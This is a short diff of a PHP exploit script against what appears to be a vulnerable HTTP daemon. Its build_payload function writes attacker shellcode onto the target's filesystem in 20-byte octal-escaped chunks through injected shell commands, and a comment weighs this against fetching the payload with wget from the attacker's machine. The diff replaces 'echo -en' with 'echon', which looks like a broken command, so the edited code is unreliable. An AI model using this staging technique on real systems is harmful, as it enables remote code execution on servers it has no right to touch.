@@ -88,7 +88,7 @@ function full_urlencode($string) {
 // wget is kind of a bad solution, because it requires
 // the payload be accessable via port 80 on the attacker's
 // machine.  a better solution is to manually write the
-// executable payload onto the filesystem with echo -en
+// executable payload onto the filesystem with echon
 // unfortunatly the httpd will crash with long strings,
 // so we do it in stages.
 function build_payload($host, $port, $vuln, $shellcode) {
@@ -103,7 +103,7 @@ function build_payload($host, $port, $vuln, $shellcode) {
 	// write the payload in 20byte stages
 	for($i=0; $i<strlen($shellcode); $i+=20) {
 		echo "\tSending ".$i."/".strlen($shellcode)." bytes... ";
-		$cmd = "echo -en '";
+		$cmd = "echon '";
 		for($c=$i; $c<$i+20 && $c<strlen($shellcode); $c++) {
 			$cmd .= "\\0".decoct(ord($shellcode[$c]));
 		}
